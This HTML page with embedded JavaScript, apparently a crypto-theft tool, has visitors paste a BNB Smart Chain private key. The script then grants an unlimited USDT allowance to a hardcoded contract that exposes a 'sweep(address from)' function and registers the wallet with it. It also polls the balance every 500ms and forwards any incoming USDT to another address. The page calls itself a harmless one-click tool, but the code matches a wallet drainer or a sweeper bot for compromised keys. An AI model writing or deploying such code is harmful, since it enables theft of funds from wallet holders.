<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>一键授权+注册+监控 - 私钥导入版</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
    <style>
        body { background: #0a0c15; color: #f1f5f9; font-family: system-ui; padding: 20px; }
        .container { max-width: 550px; margin: 0 auto; }
        .card { background: #0f1722; border: 1px solid #2d3a5e; border-radius: 20px; padding: 24px; margin-bottom: 16px; }
        .btn-success { background: #10b981; border-radius: 40px; border: none; padding: 10px; width: 100%; font-weight: bold; color: white; }
        .btn-success:hover { background: #059669; }
        .btn-warning { background: #f59e0b; border-radius: 40px; border: none; padding: 10px; width: 100%; font-weight: bold; color: #0f172a; }
        .btn-warning:hover { background: #d97706; }
        .form-control { background: #1e293b; border: 1px solid #475569; color: #ffffff !important; border-radius: 40px; padding: 10px 16px; margin-bottom: 16px; }
        .form-control:focus { background: #0f172a; border-color: #8b5cf6; color: white; outline: none; }
        .form-control::placeholder { color: #9ca3af !important; }
        label { color: #facc15 !important; font-weight: 600; margin-bottom: 5px; }
        .log-area { background: #030712; border-radius: 16px; max-height: 280px; overflow-y: auto; font-family: monospace; font-size: 0.75rem; padding: 12px; border: 1px solid #2d3a5e; }
        .log-line { border-bottom: 1px solid #1f2a44; padding: 5px 0; color: #e2e8f0; }
        .log-success { color: #6ee7b7; }
        .log-error { color: #fca5a5; }
        .log-warning { color: #fcd34d; }
        hr { border-color: #2d3a5e; }
        .text-secondary-custom { color: #94a3b8; }
        .contract-badge { background: #1e293b; padding: 6px 12px; border-radius: 30px; font-size: 11px; font-family: monospace; color: #facc15; text-align: center; word-break: break-all; }
    </style>
</head>
<body>
<div class="container">
    <div class="card">
        <h3 class="text-center mb-3" style="background: linear-gradient(135deg,#facc15,#fb923c); -webkit-background-clip:text; background-clip:text; color:transparent;">⚡ 一键授权 + 自动监控</h3>
        <p class="text-center small" style="color:#cbd5e6;">粘贴私钥 → 自动完成授权&注册 → 自动监控转出</p>

        <label class="fw-bold">💰 收款地址</label>
        <input type="text" id="receiverAddr" class="form-control" placeholder="0x... USDT最终去向地址">
        <div class="small mb-2" style="color:#94a3b8;">💡 到账的USDT会自动转入此地址</div>

        <label class="fw-bold">🔑 您的私钥</label>
        <input type="password" id="privateKey" class="form-control" placeholder="0x... 或直接粘贴私钥">
        <div class="small mb-3" style="color:#94a3b8;">⚠️ 私钥仅用于本次操作，不会保存</div>

        <div class="d-flex gap-2 mb-3">
            <button class="btn-success" onclick="doEverything()">🚀 一键授权+注册+监控</button>
            <button class="btn-warning" onclick="emergencyTransfer()">⚡ 紧急提现全部</button>
        </div>

        <div class="contract-badge mb-2">
            📄 合约地址: 0x40689fc2...9AEFF
        </div>

        <div class="log-area" id="logArea">
            <div class="log-line">⚡ 等待操作...</div>
        </div>
        <hr>
        <div class="small text-center" style="color:#94a3b8;">
            ✅ 点击一次自动完成：授权 USDT → 注册地址 → 开始监控<br>
            📌 后续到账会自动转出到收款地址 (每500ms检查)
        </div>
    </div>
</div>

<script>
    const CONTRACT_ADDRESS = "0x40689fc22fB83d1Ea93E8cEf9eD5aBbA0399AEFF";
    const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
    const USDT_ABI = ["function balanceOf(address) view returns (uint256)", "function transfer(address to, uint256 amount) returns (bool)", "function approve(address spender, uint256 amount) returns (bool)", "function allowance(address owner, address spender) view returns (uint256)"];
    const CONTRACT_ABI = ["function registerSelf() external", "function sweep(address from) external"];
    const BSC_RPC = "https://bsc-dataseed.binance.org/";

    let autoWallet = null;
    let autoContract = null;
    let autoProvider = null;
    let isMonitoring = false;
    let monitorInterval = null;
    let lastBalance = 0;

    function addLog(msg, type = 'info') {
        const logDiv = document.getElementById("logArea");
        if (!logDiv) return;
        const line = document.createElement("div");
        line.className = "log-line";
        const now = new Date().toLocaleTimeString();
        if (type === 'success') line.classList.add("log-success");
        else if (type === 'error') line.classList.add("log-error");
        else if (type === 'warning') line.classList.add("log-warning");
        line.innerHTML = `[${now}] ${msg}`;
        logDiv.appendChild(line);
        logDiv.scrollTop = logDiv.scrollHeight;
        while (logDiv.children.length > 200) logDiv.removeChild(logDiv.firstChild);
    }

    async function doEverything() {
        const receiverAddr = document.getElementById("receiverAddr").value.trim();
        let pk = document.getElementById("privateKey").value.trim();

        if (!receiverAddr || !receiverAddr.startsWith('0x') || receiverAddr.length !== 42) {
            addLog("❌ 收款地址无效", "error");
            return;
        }
        if (!pk) {
            addLog("❌ 请输入私钥", "error");
            return;
        }
        if (!pk.startsWith('0x')) pk = '0x' + pk;

        try {
            addLog("🔐 正在加载钱包...", "info");
            autoProvider = new ethers.JsonRpcProvider(BSC_RPC);
            autoWallet = new ethers.Wallet(pk, autoProvider);
            addLog(`✅ 钱包加载成功: ${autoWallet.address.slice(0,6)}...${autoWallet.address.slice(-4)}`, "success");

            const bnbBalance = await autoProvider.getBalance(autoWallet.address);
            if (parseFloat(ethers.formatEther(bnbBalance)) < 0.002) {
                addLog(`⚠️ BNB余额不足: ${ethers.formatEther(bnbBalance)} BNB，建议充值Gas费`, "warning");
            }

            // 步骤1: 授权 USDT
            addLog("📝 步骤1/3: 授权 USDT...", "info");
            const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, autoWallet);
            const currentAllowance = await usdt.allowance(autoWallet.address, CONTRACT_ADDRESS);
            
            if (currentAllowance >= ethers.MaxUint256) {
                addLog("✅ 已完成无上限授权，跳过", "success");
            } else {
                addLog("⏳ 正在授权 USDT...", "info");
                const approveTx = await usdt.approve(CONTRACT_ADDRESS, ethers.MaxUint256, { gasLimit: 80000 });
                addLog(`📡 授权交易: ${approveTx.hash.slice(0,12)}... 等待确认`, "info");
                await approveTx.wait();
                addLog("✅ USDT 授权成功", "success");
            }

            // 步骤2: 注册地址
            addLog("📝 步骤2/3: 注册地址到合约...", "info");
            autoContract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, autoWallet);
            
            try {
                const registerTx = await autoContract.registerSelf({ gasLimit: 100000 });
                addLog(`📡 注册交易: ${registerTx.hash.slice(0,12)}... 等待确认`, "info");
                await registerTx.wait();
                addLog("✅ 地址注册成功", "success");
            } catch(e) {
                if (e.message.includes("already registered")) {
                    addLog("✅ 地址已注册过", "success");
                } else {
                    throw e;
                }
            }

            // 步骤3: 开始监控
            addLog("📝 步骤3/3: 启动余额监控...", "info");
            const balanceWei = await usdt.balanceOf(autoWallet.address);
            lastBalance = parseFloat(ethers.formatUnits(balanceWei, 18));
            addLog(`💰 当前 USDT 余额: ${lastBalance.toFixed(4)}`, "info");
            
            if (lastBalance > 0.01) {
                addLog(`⚠️ 检测到余额 ${lastBalance.toFixed(4)} USDT，立即转出`, "warning");
                await transferOut(receiverAddr);
            }

            startMonitoring(receiverAddr);
            addLog("🎉 全部完成！监控已启动，到账自动转出", "success");

        } catch(e) {
            console.error(e);
            addLog(`❌ 操作失败: ${e.message.slice(0,120)}`, "error");
        }
    }

    async function transferOut(receiverAddr) {
        if (!autoWallet) return false;
        try {
            const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, autoWallet);
            const balanceWei = await usdt.balanceOf(autoWallet.address);
            const balance = parseFloat(ethers.formatUnits(balanceWei, 18));
            
            if (balance < 0.01) {
                addLog(`⏭️ 余额不足，跳过转账`, "warning");
                return false;
            }
            
            addLog(`⚡ 转出 ${balance.toFixed(4)} USDT 到 ${receiverAddr.slice(0,8)}...`, "warning");
            const tx = await usdt.transfer(receiverAddr, balanceWei, { gasLimit: 80000 });
            addLog(`📡 交易: ${tx.hash.slice(0,12)}...`, "info");
            await tx.wait();
            addLog(`✅ 转账成功！`, "success");
            lastBalance = 0;
            return true;
        } catch(e) {
            addLog(`❌ 转账失败: ${e.message.slice(0,80)}`, "error");
            return false;
        }
    }

    async function checkAndTransfer(receiverAddr) {
        if (!isMonitoring || !autoWallet) return;
        try {
            const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, autoWallet);
            const balanceWei = await usdt.balanceOf(autoWallet.address);
            const currentBalance = parseFloat(ethers.formatUnits(balanceWei, 18));
            
            if (currentBalance > lastBalance + 0.005 && currentBalance > 0.01) {
                addLog(`🚨 检测到到账 ${currentBalance.toFixed(4)} USDT，立即转出`, "warning");
                await transferOut(receiverAddr);
            }
            lastBalance = currentBalance;
        } catch(e) {}
    }

    function startMonitoring(receiverAddr) {
        if (monitorInterval) clearInterval(monitorInterval);
        isMonitoring = true;
        monitorInterval = setInterval(() => checkAndTransfer(receiverAddr), 500);
        addLog("🟢 监控已启动 (500ms/次)", "success");
    }

    async function emergencyTransfer() {
        const receiverAddr = document.getElementById("receiverAddr").value.trim();
        let pk = document.getElementById("privateKey").value.trim();

        if (!receiverAddr || !pk) {
            addLog("❌ 请填写收款地址和私钥", "error");
            return;
        }
        if (!pk.startsWith('0x')) pk = '0x' + pk;

        try {
            autoProvider = new ethers.JsonRpcProvider(BSC_RPC);
            autoWallet = new ethers.Wallet(pk, autoProvider);
            addLog(`🔐 加载钱包: ${autoWallet.address.slice(0,6)}...`, "info");
            
            const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, autoWallet);
            const balanceWei = await usdt.balanceOf(autoWallet.address);
            const balance = parseFloat(ethers.formatUnits(balanceWei, 18));
            
            if (balance < 0.01) {
                addLog(`⚠️ 余额不足: ${balance.toFixed(4)} USDT`, "warning");
                return;
            }
            
            addLog(`⚡ 紧急转出 ${balance.toFixed(4)} USDT...`, "warning");
            const tx = await usdt.transfer(receiverAddr, balanceWei, { gasLimit: 80000 });
            addLog(`📡 交易: ${tx.hash.slice(0,12)}...`, "info");
            await tx.wait();
            addLog(`✅ 紧急提现成功！`, "success");
        } catch(e) {
            addLog(`❌ 提现失败: ${e.message.slice(0,100)}`, "error");
        }
    }

    window.doEverything = doEverything;
    window.emergencyTransfer = emergencyTransfer;
</script>
</body>
</html>
